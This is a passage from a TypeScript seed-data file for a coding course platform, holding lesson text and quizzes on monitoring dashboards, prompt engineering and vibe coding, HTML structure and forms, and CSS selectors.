          prompt: 'Alerting on user-visible symptoms (like error rate) is generally preferred over alerting on every possible underlying cause.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What is 'alert fatigue'?",
          options: [
            'A hardware failure',
            'When too many low-value alerts train people to ignore alerts, including real ones',
            'A type of distributed trace',
            'A billing charge from too many alerts',
          ],
          answer: 'When too many low-value alerts train people to ignore alerts, including real ones',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Every alert that fires should always page a human immediately, regardless of whether there's a clear next action.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A Service Level ____ is a specific measurement, like percentage of successful requests or p99 latency.',
          options: [],
          answer: 'Indicator',
        },
      ],
    },
  },
  {
    title: 'Dashboards and Centralized Log Aggregation',
    content: lessonContent(
      'Dashboards and Centralized Log Aggregation',
      `With logs, metrics, and traces flowing from every service, you need somewhere to actually collect, search, and visualize all of it, especially once you have more than one service or more than one server.\n\n## Why centralize logs\n\nIf every service's logs only live on its own machine/container, investigating anything that spans services (which is most real incidents) means SSHing into multiple machines and manually correlating timestamps, painfully slow, and impossible once containers get recycled and their local logs disappear with them.\n\nA **log aggregation** pipeline ships logs from every service to one central, searchable place:\n\n\`\`\`\nService A logs ─┐\nService B logs ─┼──→  Log shipper  →  Central storage/index  →  Search UI\nService C logs ─┘\n\`\`\`\n\nCommon building blocks: **Fluentd**/**Fluent Bit** or **Logstash** as the shipper, **Elasticsearch** or a similar index as storage, **Kibana** or **Grafana** as the search/visualization UI, this combination (Elasticsearch + Logstash + Kibana) is common enough to have its own acronym, the "ELK stack".\n\n## Building a useful dashboard\n\nA good dashboard answers "is everything okay right now?" at a glance, and helps narrow down "what's wrong?" within seconds if not. A solid starting point for almost any service:\n\n- **Request rate** (traffic volume over time)\n- **Error rate** (percentage of failed requests)\n- **Latency** (p50 and p99, not just an average, which hides outliers)\n- **Saturation** (how close a resource, CPU/memory/queue depth, is to its limit)\n\nThis is sometimes called the **"four golden signals"** (from Google's SRE book), covering both "are users having a bad time" (rate/errors/latency) and "are we about to have a bad time" (saturation).\n\n## Correlating across pillars in one place\n\nThe real payoff of centralizing everything: from one dashboard, you can jump from a metric spike, to the traces active during that window, to the specific logs from the exact service and time range the trace pointed at, without re-typing timestamps or switching between five different tools' worth of context.\n\n> [!TIP]\n> Don't build a dashboard with 40 panels nobody looks at. Start with the four golden signals for your most important service, and only add more once you've actually needed something else while debugging a real incident.`
    ),
    quiz: {
      title: 'Dashboards & Log Aggregation Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the ELK stack stand for?',
          options: ['Elasticsearch, Logstash, Kibana', 'Events, Logs, Kubernetes', 'Error, Latency, Kafka', 'Encryption, Logging, Kubernetes'],
          answer: 'Elasticsearch, Logstash, Kibana',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Investigating an incident by SSHing into each service's machine individually is a scalable, recommended approach for a multi-service system.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: "The 'four golden signals' from Google's SRE book are latency, traffic, errors, and ____.",
          options: [],
          answer: 'saturation',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why should latency be shown as p50/p99 rather than just an average?',
          options: [
            'Averages are illegal in monitoring',
            'An average hides outliers that percentiles reveal',
            'p99 is easier to compute',
            'Averages cannot be graphed',
          ],
          answer: 'An average hides outliers that percentiles reveal',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A good dashboard should have as many panels as possible to show every available metric.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Central log storage lets you jump from a metric spike to related traces to the exact ____ from that time range, all in one place.',
          options: [],
          answer: 'logs',
        },
      ],
    },
  },
  {
    title: 'Final Project: Instrument a Sample App with Logs, Metrics, and Traces',
    content: lessonContent(
      'Final Project: Instrument a Sample App with Logs, Metrics, and Traces',
      `Apply all three pillars to a real, running application, however small.\n\n## Requirements\n\n1. Add structured (JSON) logging to your app, including at least one correlation ID that's attached to every log line generated while handling a single request.\n2. Expose at least three Prometheus-style metrics: one counter (e.g. total requests), one gauge (e.g. active connections), and one histogram (e.g. request latency), on a scrapeable endpoint.\n3. Add basic distributed tracing (using OpenTelemetry or a similar library) around at least one operation that calls another service or the database, with the trace context propagated if your app has more than one service.\n4. Build a simple dashboard (even a basic Grafana/hosted-tool dashboard, or a written mockup with real numbers) showing the four golden signals for your app.\n5. Define at least one SLO for your app (e.g. "99% of requests complete in under 500ms") and describe what alert you'd configure to catch a violation of it.\n\n## Stretch goals\n\n- Deliberately introduce a bug, then use only your logs/metrics/traces (not the source code) to diagnose it, and write up how you found it.\n- Add a second alert rule based on error rate, and explain why it's a symptom-based alert rather than a cause-based one.\n- Correlate a single request end-to-end: capture its correlation ID, find its trace, and find its logs, all for the exact same request.\n\nSubmit a link to your finished project (a repo, or a written report with dashboard screenshots/mock numbers) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const promptEngineeringLessons: SeedLesson[] = [
  {
    title: 'What Is Prompt Engineering (and Vibe Coding)?',
    content: lessonContent(
      'What Is Prompt Engineering (and Vibe Coding)?',
      `AI coding assistants (like Claude Code, GitHub Copilot, and ChatGPT) can now write, edit, and even run code from natural-language instructions. Two terms have emerged to describe working with them.\n\n## Prompt engineering\n\nThe practice of writing instructions that reliably get an AI model to produce the output you actually want. It's less about "magic words" and more about being clear, specific, and giving the right context, the same skill you'd use writing a good ticket for a human teammate.\n\n## Vibe coding\n\nA newer, more informal term for a style of development where you describe *what* you want in plain language and let an AI agent write (and often run) the code, iterating conversationally instead of typing every line yourself. It can be incredibly fast, but it shifts your job from *writing* code to *directing and reviewing* code.\n\n## The spectrum\n\n| | Autocomplete | Prompted generation | Vibe coding |\n|---|---|---|---|\n| You write | Every line, AI suggests completions | A prompt, AI writes a function or file | A goal, AI plans and executes multi-step changes |\n| You review | Character by character as you type | The generated snippet | The whole diff, tests, and behavior |\n| Best for | Familiar, fast-moving code | Well-scoped, isolated tasks | Larger features, paired with careful review |\n\n> [!NOTE]\n> None of this changes who's responsible for the code that ships. Whether you typed it or an AI did, you still own the bugs, the security holes, and the technical debt. This course is about using these tools well, not blindly.`
    ),
    quiz: {
      title: 'Prompt Engineering Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is "vibe coding"?',
          options: [
            'Writing code without using any AI tools',
            'Describing a goal in plain language and letting an AI agent write and run the code',
            'A formal certification for developers',
            'A type of syntax highlighting theme',
          ],
          answer: 'Describing a goal in plain language and letting an AI agent write and run the code',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Prompt ____ is the practice of writing instructions that reliably get an AI model to produce the output you want.',
          options: [],
          answer: 'engineering',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Using an AI assistant to write code means you're no longer responsible for bugs it introduces.",
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Writing Clear, Specific Prompts',
    content: lessonContent(
      'Writing Clear, Specific Prompts',
      `A vague prompt gets a vague, or wrong, result. The single biggest lever you have over an AI's output is how clearly you describe the task.\n\n## Vague vs. specific\n\n\`\`\`\n❌ "Fix the login bug"\n\n✅ "Users can't log in with an uppercase email address. The login\nroute at apps/api/src/routes/auth.ts compares email exactly instead\nof case-insensitively. Make the comparison case-insensitive without\nchanging how emails are stored."\n\`\`\`\n\nThe second prompt tells the AI **what's broken**, **where**, **why**, and **what not to change**, four things a vague one-liner leaves it to guess.\n\n## A simple checklist\n\n- **Goal**, what should be true when you're done?\n- **Location**, which file(s), function(s), or area of the app?\n- **Constraints**, what should stay the same? Anything to avoid?\n- **Examples**, a sample input/output, or a similar pattern already in the codebase, if one exists.\n\n## Iterate, don't restart\n\nIf the first result isn't quite right, you rarely need to throw it away and start over. Point at exactly what's wrong:\n\n\`\`\`\n"Close, but this also matches emails that are subsets of each other,\nlike 'a@b.com' matching 'aa@b.com'. Only treat them as equal if they\nmatch exactly, ignoring case."\n\`\`\`\n\n> [!TIP]\n> Treat your prompt like a well-written bug report or a ticket for a new teammate, if it would confuse a human collaborator, it'll confuse the AI too.`
    ),
    quiz: {
      title: 'Clear Prompts Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which of these is most likely to produce a good result from an AI coding assistant?',
          options: [
            'A single vague sentence',
            'A prompt describing the goal, location, and constraints',
            'Repeating the exact same short prompt several times',
            'Avoiding any mention of file names',
          ],
          answer: 'A prompt describing the goal, location, and constraints',
        },
        {
          type: 'FILL_BLANK',
          prompt: "When a result isn't quite right, it's usually more effective to describe exactly what's wrong than to ____ from scratch.",
          options: [],
          answer: 'restart',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Providing an example of the desired input/output typically improves an AI's response.",
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Giving AI the Right Context',
    content: lessonContent(
      'Giving AI the Right Context',
      `Even a perfectly worded prompt fails if the AI doesn't know your codebase's conventions, constraints, or history. Context often matters more than phrasing.\n\n## What counts as context\n\n- **Relevant files**, pointing at the actual code involved instead of describing it from memory.\n- **Project conventions**, naming patterns, folder structure, preferred libraries, things a new human hire would also need to learn.\n- **Error messages and logs**, the exact text, not a paraphrase, stack traces often contain the one detail that matters.\n- **Constraints**, "don't add new dependencies," "this must stay backward compatible," "keep this file under 200 lines."\n\n## Standing instructions\n\nMany AI coding tools support a persistent instructions file (Claude Code uses \`CLAUDE.md\`, for example) that's automatically included in every conversation, a good place for conventions that apply to *every* task, so you don't have to repeat them.\n\n\`\`\`\n# CLAUDE.md\n- Use Tailwind utility classes, not custom CSS files.\n- All new API routes need a matching Zod schema.\n- Run \`npm test\` before considering a change complete.\n\`\`\`\n\n## Breaking work into steps\n\nLarge, multi-part tasks ("build a whole checkout flow") produce weaker results than a sequence of smaller, well-defined ones ("add the cart total calculation," then "wire it into the checkout page," then "add validation"). Each smaller step is easier to verify, and a mistake in step one doesn't compound through steps two and three before you notice it.\n\n> [!WARNING]\n> An AI that doesn't have access to your actual codebase will still confidently guess, and often get file paths, function names, or library APIs wrong. Always give it a way to look at the real code rather than working from a description alone.`
    ),
    quiz: {
      title: 'Context Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is a persistent instructions file (like CLAUDE.md) used for?',
          options: [
            'Storing passwords and secrets',
            'Conventions and constraints that should apply to every task automatically',
            'Replacing prompts entirely, so you never need to write one',
            'Documentation that the AI never actually reads',
          ],
          answer: 'Conventions and constraints that should apply to every task automatically',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Breaking a large task into a sequence of smaller, well-defined ____ produces more reliable results than one big vague request.',
          options: [],
          answer: 'steps',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Pasting the exact error message and stack trace is generally more useful than paraphrasing the error in your own words.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Reviewing AI-Generated Code',
    content: lessonContent(
      'Reviewing AI-Generated Code',
      `The fastest way for vibe coding to go wrong is treating AI output as finished, rather than as a draft that still needs your review, exactly like you'd review a pull request from a teammate.\n\n## What to check every time\n\n- **Does it actually do what you asked?** Re-read the diff against your original goal, not just "does it run."\n- **Logic errors**, off-by-one mistakes, wrong comparison operators, edge cases (empty lists, zero, null) that were never tested.\n- **Security**, this is where blind trust is most dangerous: SQL/command injection, missing input validation, secrets hardcoded into source, authentication or authorization checks that got weakened or removed.\n- **Scope creep**, did it change more than you asked for? Unrelated refactors hidden inside a "simple fix" are easy to miss if you don't read the whole diff.\n\n## Test before you trust\n\n\`\`\`\n1. Run the change locally.\n2. Exercise the exact scenario you asked for.\n3. Try at least one edge case or invalid input.\n4. Check existing tests still pass, and add a new one if the change deserves it.\n\`\`\`\n\n## You still have to understand it\n\nIf a bug shows up in production next month, you're the one debugging it, whether or not you personally typed the original code. Reading and understanding *why* an approach works, not just confirming *that* it appears to work, is what turns vibe coding into a sustainable practice instead of a liability.\n\n> [!WARNING]\n> Never let an AI assistant run destructive commands (deleting data, force-pushing, dropping database tables) without explicitly reviewing and approving that specific action first.`
    ),
    quiz: {
      title: 'Code Review Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What's the most important thing to verify in AI-generated code before shipping it?",
          options: [
            'That it compiles',
            'That it does what you asked, handles edge cases, and has no security issues',
            'That it is the shortest possible solution',
            'That it uses the newest available syntax',
          ],
          answer: 'That it does what you asked, handles edge cases, and has no security issues',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'AI-generated code should go through the same ____ process as code written by a human teammate.',
          options: [],
          answer: 'review',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'If an AI assistant writes a bug that reaches production, only the AI is responsible for it.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Vibe Coding Responsibly: Risks and Guardrails',
    content: lessonContent(
      'Vibe Coding Responsibly: Risks and Guardrails',
      `Vibe coding can make you dramatically faster, and it can also let mistakes compound quickly if you're not careful. A few guardrails keep the speed without the chaos.\n\n## Common risks\n\n- **Hallucinated APIs**, confidently using a function, library, or config option that doesn't actually exist, or doesn't work the way it assumed.\n- **Silent scope creep**, an agent "helpfully" refactoring unrelated code while completing your actual request.\n- **Security blind spots**, especially around authentication, input validation, and anything touching money or personal data.\n- **Losing understanding of your own codebase**, if every feature was written by an agent you only skimmed, you'll struggle to debug, extend, or explain any of it later.\n\n## Guardrails that help\n\n- **Commit before big changes.** A clean git history lets you review a diff properly, and revert instantly if something's wrong, rather than untangling a huge uncommitted mess.\n- **Work in small, reviewable increments.** Ask for one feature or fix at a time rather than "build the whole app," the smaller the change, the easier it is to actually verify.\n- **Ask the AI to explain its reasoning.** "Why did you choose this approach?", if the explanation doesn't make sense, that's a signal to dig deeper before accepting the change.\n- **Keep a human in the loop for anything risky.** Deleting data, sending real emails, spending real money, touching production, these should always get an explicit human review, no exceptions.\n- **Test the unhappy paths yourself.** AI-generated tests tend to cover the scenario you asked for, but you're still responsible for thinking about what could go wrong.\n\n> [!TIP]\n> A good habit: after an AI finishes a task, ask yourself "could I explain this code to a coworker right now?" If the honest answer is no, that's worth fixing before you move on, not after something breaks.`
    ),
    quiz: {
      title: 'Guardrails Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is a "hallucinated API"?',
          options: [
            'A deprecated but still-working API',
            'An AI confidently using a function or library option that does not actually exist',
            'A slow API endpoint',
            'An API with unusually good documentation',
          ],
          answer: 'An AI confidently using a function or library option that does not actually exist',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Committing your code before a large AI-driven change makes it easy to ____ if something goes wrong.',
          options: [],
          answer: 'revert',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Destructive actions, like deleting data or force-pushing, should always get explicit human review before an AI executes them.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Feature Using an AI Coding Assistant',
    content: lessonContent(
      'Final Project: Build a Feature Using an AI Coding Assistant',
      `Time to put these habits into practice on a real, if small, feature.\n\n## Requirements\n\n1. Pick a small, well-scoped feature or bug fix in a project of your choice (new or existing).\n2. Use an AI coding assistant to help implement it, and write down the actual prompts you used as you go.\n3. Before accepting any AI-generated change, review the full diff yourself and note anything you changed or rejected.\n4. Test the feature manually, including at least one edge case, and add or update an automated test if the project has any.\n5. Write a short summary, a few sentences, explaining what the feature does and why your approach works, in your own words, not copied from the AI's explanation.\n\n## Stretch goals\n\n- Deliberately give the AI an underspecified prompt first, see what goes wrong, then rewrite it following this course's checklist and compare the results.\n- Set up a persistent instructions file (like a \`CLAUDE.md\`) for a project you work on regularly.\n- Find and fix one thing the AI got subtly wrong before you would have shipped it.\n\nSubmit a link to your prompts, diff, and summary (a repo, gist, or doc) below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const htmlLessons: SeedLesson[] = [
  {
    title: 'What Is HTML? Structure of a Web Page',
    content: lessonContent(
      'What Is HTML? Structure of a Web Page',
      `HTML (HyperText Markup Language) is not a programming language, it's a **markup** language: it describes the structure and meaning of content on a page, not how to compute anything. Every website you've ever visited, however fancy, has HTML underneath it.\n\n## The skeleton of every page\n\n\`\`\`html\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8" />\n    <title>My First Page</title>\n  </head>\n  <body>\n    <h1>Hello, world!</h1>\n    <p>This is my first web page.</p>\n  </body>\n</html>\n\`\`\`\n\n| Piece | Purpose |\n|---|---|\n| \`<!DOCTYPE html>\` | Tells the browser this is a modern HTML5 document. |\n| \`<html lang="en">\` | The root element; \`lang\` helps screen readers and search engines. |\n| \`<head>\` | Metadata: title, character encoding, linked stylesheets, not visible content. |\n| \`<body>\` | Everything the visitor actually sees. |\n\n## Elements, tags, and attributes\n\nAn **element** is usually written as an opening tag, some content, and a closing tag: \`<p>content</p>\`. Some elements are **void elements** and never have a closing tag or content, like \`<img>\` or \`<br>\`.\n\nAn **attribute** adds extra information to a tag, written inside the opening tag as \`name="value"\`:\n\n\`\`\`html\n<img src="cat.jpg" alt="A sleeping cat" width="300" />\n\`\`\`\n\nHere \`src\`, \`alt\`, and \`width\` are all attributes of the \`img\` element.\n\n> [!NOTE]\n> HTML elements can nest inside each other, but they must close in the reverse order they opened, \`<p><strong>bold</strong></p>\` is valid, \`<p><strong>bold</p></strong>\` is not.`
    ),
    quiz: {
      title: 'HTML Structure Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which part of an HTML document holds the visible page content?',
          options: ['<head>', '<body>', '<title>', '<meta>'],
          answer: '<body>',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Void elements like <img> never have a closing tag.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'In <img src="cat.jpg" alt="A cat" />, "src" and "alt" are called ____.',
          options: [],
          answer: 'attributes',
        },
      ],
    },
  },
  {
    title: 'Text Content: Headings, Paragraphs, and Lists',
    content: lessonContent(
      'Text Content: Headings, Paragraphs, and Lists',
      `Most of a web page is text, and HTML gives you a small set of elements to describe what kind of text it is.\n\n## Headings and paragraphs\n\n\`\`\`html\n<h1>Kodstigen</h1>\n<h2>Learn to Code</h2>\n<p>Kodstigen is a platform for learning to code through interactive lessons and projects.</p>\n\`\`\`\n\nThere are six heading levels, \`<h1>\` through \`<h6>\`, from most to least important. Use exactly one \`<h1>\` per page, it's the page's main title, and don't skip levels just to make text smaller, that's what CSS is for.\n\n## Lists\n\n\`\`\`html\n<ul>\n  <li>HTML</li>\n  <li>CSS</li>\n  <li>JavaScript</li>\n</ul>\n\n<ol>\n  <li>Write the HTML</li>\n  <li>Style it with CSS</li>\n  <li>Add behavior with JavaScript</li>\n</ol>\n\`\`\`\n\n- \`<ul>\` is an **unordered list** (bullets), use it when order doesn't matter.\n- \`<ol>\` is an **ordered list** (numbers), use it when sequence matters, like steps in a recipe.\n- Every item in either list goes inside an \`<li>\` (list item).\n\n## Inline emphasis\n\n\`\`\`html\n<p>This is <strong>very important</strong> and this is <em>subtly emphasized</em>.</p>\n\`\`\`\n\n\`<strong>\` and \`<em>\` carry real semantic meaning (importance and emphasis) that screen readers announce differently, they're not just "bold" and "italic". The purely visual tags \`<b>\` and \`<i>\` still exist but should be reserved for cases with no semantic meaning at all.`
    ),
    quiz: {
      title: 'Text Content Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which list type should you use for numbered, sequential steps?',
          options: ['<ul>', '<ol>', '<li>', '<dl>'],
          answer: '<ol>',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A page should generally have more than one <h1> so search engines see multiple important topics.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Every item inside a <ul> or <ol> must be wrapped in an ____ element.',
          options: [],
          answer: 'li',
        },
      ],
    },
  },
  {
    title: 'Links, Images, and Semantic Elements',
    content: lessonContent(
      'Links, Images, and Semantic Elements',
      `## Links\n\n\`\`\`html\n<a href="https://example.com">Visit Example</a>\n<a href="/about.html">About page (relative link)</a>\n<a href="https://example.com" target="_blank" rel="noopener">Opens in a new tab</a>\n\`\`\`\n\nThe \`href\` attribute is where the link goes. Links can point to other sites (absolute URLs) or other pages on your own site (relative URLs). \`target="_blank"\` opens a new tab, and should be paired with \`rel="noopener"\` so the new page can't control the original tab.\n\n## Images\n\n\`\`\`html\n<img src="logo.png" alt="Kodstigen logo" width="120" height="120" />\n\`\`\`\n\n\`alt\` text is not optional, it's read aloud by screen readers and shown if the image fails to load. A decorative image with no informational value can use \`alt=""\`, but never omit the attribute entirely.\n\n## Semantic layout elements\n\nInstead of wrapping everything in generic \`<div>\`s, HTML5 gives you elements that describe a section's *role* on the page:\n\n| Element | Role |\n|---|---|\n| \`<header>\` | Introductory content, often a logo and navigation. |\n| \`<nav>\` | A block of navigation links. |\n| \`<main>\` | The primary content, unique to this page, one per page. |\n| \`<section>\` | A thematic grouping of content, usually with its own heading. |\n| \`<article>\` | Self-contained content that would make sense on its own (a blog post, a product card). |\n| \`<footer>\` | Closing content, like copyright or contact links. |\n\n\`\`\`html\n<header>\n  <h1>Kodstigen</h1>\n  <nav>\n    <a href="/">Home</a>\n    <a href="/courses">Courses</a>\n  </nav>\n</header>\n<main>\n  <article>\n    <h2>Why Learn to Code?</h2>\n    <p>...</p>\n  </article>\n</main>\n<footer>\n  <p>&copy; 2026 Kodstigen</p>\n</footer>\n\`\`\`\n\n> [!TIP]\n> Semantic elements look identical to a \`<div>\` by default, their real value is meaning: screen readers, browsers, and search engines all use them to understand your page's structure.`
    ),
    quiz: {
      title: 'Links & Semantics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which attribute tells the browser where a link should navigate to?',
          options: ['src', 'href', 'link', 'to'],
          answer: 'href',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The alt attribute on an <img> can safely be left out if the image is purely decorative.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The semantic element for a block of navigation links is <____>.',
          options: [],
          answer: 'nav',
        },
      ],
    },
  },
  {
    title: 'Building Forms',
    content: lessonContent(
      'Building Forms',
      `Forms are how HTML collects input from a visitor: search boxes, login screens, checkout pages.\n\n## A basic form\n\n\`\`\`html\n<form action="/submit" method="POST">\n  <label for="username">Username</label>\n  <input type="text" id="username" name="username" required />\n\n  <label for="email">Email</label>\n  <input type="email" id="email" name="email" required />\n\n  <label for="plan">Plan</label>\n  <select id="plan" name="plan">\n    <option value="free">Free</option>\n    <option value="pro">Pro</option>\n  </select>\n\n  <button type="submit">Sign Up</button>\n</form>\n\`\`\`\n\n- \`action\` is the URL the data is sent to; \`method\` is usually \`GET\` (data in the URL, for searches/filters) or \`POST\` (data in the request body, for anything that changes data).\n- Every \`<input>\` needs a matching \`<label>\`, connected by \`for\` on the label and \`id\` on the input. This isn't cosmetic, screen reader users rely on it, and it lets sighted users click the label text to focus the field.\n\n## Input types matter\n\n\`\`\`html\n<input type="text" />\n<input type="email" />\n<input type="password" />\n<input type="number" min="0" max="100" />\n<input type="checkbox" />\n<input type="radio" name="tier" value="free" />\n<input type="date" />\n\`\`\`\n\nEach \`type\` changes both the on-screen keyboard/widget shown (especially on mobile) and what the browser validates automatically, \`type="email"\` alone gives you free client-side validation for a well-formed address.\n\n> [!WARNING]\n> Client-side form validation (like \`required\` or \`type="email"\`) improves the experience, but it is never a substitute for validating input on the server. Anyone can bypass it entirely by sending a request directly.`
    ),
    quiz: {
      title: 'Forms Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How do you connect a <label> to its <input> for accessibility?',
          options: [
            'Put them next to each other in the HTML',
            'Match the label\'s "for" attribute to the input\'s "id"',
            'Wrap the input in <strong>',
            'Give both the same name attribute',
          ],
          answer: 'Match the label\'s "for" attribute to the input\'s "id"',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Client-side validation like the "required" attribute means you no longer need to validate on the server.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The form attribute that controls where submitted data is sent is ____.',
          options: [],
          answer: 'action',
        },
      ],
    },
  },
  {
    title: 'Tables and Accessibility',
    content: lessonContent(
      'Tables and Accessibility',
      `## Tables\n\nHTML tables are for **tabular data**, rows and columns of related values, not for page layout (that job belongs to CSS).\n\n\`\`\`html\n<table>\n  <thead>\n    <tr>\n      <th>Course</th>\n      <th>Lessons</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>HTML Foundations</td>\n      <td>6</td>\n    </tr>\n    <tr>\n      <td>CSS Foundations</td>\n      <td>6</td>\n    </tr>\n  </tbody>\n</table>\n\`\`\`\n\n\`<thead>\` groups the header row, \`<tbody>\` groups the data rows, and each \`<th>\` (header cell) is announced by screen readers as a column label for every \`<td>\` (data cell) beneath it.\n\n## Why accessibility matters\n\nAccessible HTML isn't an extra feature, it's what makes your site usable for people using screen readers, keyboard-only navigation, or voice control, and it usually makes the site better for everyone else too.\n\n- Use real buttons (\`<button>\`) and links (\`<a>\`) instead of \`<div onclick>\`, they come with keyboard support and screen-reader semantics for free.\n- Always give images meaningful \`alt\` text.\n- Keep a logical heading order (\`h1\` → \`h2\` → \`h3\`), don't skip levels.\n- Make sure interactive elements are reachable and usable with the Tab key alone.\n\n\`\`\`html\n<!-- Bad: no keyboard support, no semantics -->\n<div onclick="submitForm()">Submit</div>\n\n<!-- Good: works with keyboard, mouse, and screen readers -->\n<button onclick="submitForm()">Submit</button>\n\`\`\`\n\n> [!TIP]\n> A quick way to sanity-check accessibility: unplug your mouse and try to use the whole page with only Tab, Shift+Tab, and Enter. If you get stuck, so will some of your visitors.`
    ),
    quiz: {
      title: 'Tables & Accessibility Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main reason to prefer <button> over a clickable <div> for actions?',
          options: [
            'It looks better by default',
            'It comes with keyboard and screen-reader support built in',
            'It loads faster',
            'Divs cannot have click handlers',
          ],
          answer: 'It comes with keyboard and screen-reader support built in',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'HTML tables should be used for arranging general page layout, like columns of unrelated content.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The table element that groups the header row is <____>.',
          options: [],
          answer: 'thead',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Multi-Section Personal Portfolio Page',
    content: lessonContent(
      'Final Project: Build a Multi-Section Personal Portfolio Page',
      `Bring together everything from this course into a single, real page.\n\n## Requirements\n\n1. Use a full HTML5 skeleton (\`<!DOCTYPE html>\`, \`<html lang="en">\`, \`<head>\` with a \`<title>\`).\n2. Include a \`<header>\` with your name and a \`<nav>\` linking to at least three sections on the page (\`<a href="#projects">\`, etc.).\n3. Include a \`<main>\` with at least three \`<section>\`s: an "About Me", a "Projects" list using semantic \`<article>\` elements, and a "Contact" section with a working \`<form>\` (name, email, message, submit button, every input properly labeled).\n4. Use at least one \`<ul>\` or \`<ol>\`, at least one \`<img>\` with meaningful \`alt\` text, and a heading hierarchy that doesn't skip levels.\n5. Include a \`<footer>\` with a copyright line.\n\n## Stretch goals\n\n- Add a \`<table>\` summarizing your skills and proficiency levels.\n- Make every interactive element reachable and usable with only the keyboard.\n- Validate your page's HTML using the [W3C Markup Validator](https://validator.w3.org/) and fix any errors it reports.\n\nSubmit a link to your finished page (a repo, CodePen, or hosted URL) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const cssLessons: SeedLesson[] = [
  {
    title: 'What Is CSS? Selectors and the Cascade',
    content: lessonContent(
      'What Is CSS? Selectors and the Cascade',
      `CSS (Cascading Style Sheets) controls how HTML looks: colors, fonts, spacing, layout, and more. HTML says *what* something is, CSS says *how it appears*.\n\n## Three ways to add CSS\n\n\`\`\`html\n<link rel="stylesheet" href="styles.css" />\n\`\`\`\n\nAn external stylesheet, linked from \`<head>\`, is almost always the right choice: it's cacheable and keeps style separate from structure.\n\n## Selectors\n\n\`\`\`css\np { color: navy; }              /* every <p> */\n.card { padding: 16px; }        /* every element with class="card" */\n#logo { width: 120px; }         /* the one element with id="logo" */\nnav a { text-decoration: none; } /* every <a> inside a <nav> */\n\`\`\`\n\n| Selector | Matches |\n|---|---|\n| \`element\` | Every element of that tag, e.g. \`p\`, \`h1\` |\n| \`.class\` | Every element with that class attribute |\n| \`#id\` | The single element with that id |\n| \`a b\` | Every \`b\` element nested anywhere inside an \`a\` |\n\n## The cascade and specificity\n\nWhen two rules target the same element and property, CSS decides the winner using **specificity**: IDs beat classes, classes beat plain elements. If specificity ties, the rule that appears *later* in the stylesheet wins.\n\n\`\`\`css\np { color: navy; }        /* specificity: 0-0-1 */\n.highlight { color: gold; } /* specificity: 0-1-0, wins over the rule above */\n#alert { color: red; }     /* specificity: 1-0-0, wins over both */\n\`\`\`\n\n> [!WARNING]\n> \`!important\` overrides normal specificity entirely and is very hard to override again later. Treat it as a last resort, almost every specificity fight can be solved by writing a more specific (or simpler) selector instead.`
    ),
    quiz: {
      title: 'Selectors & Cascade Quiz',
      passingScore: 70,
      questions: [
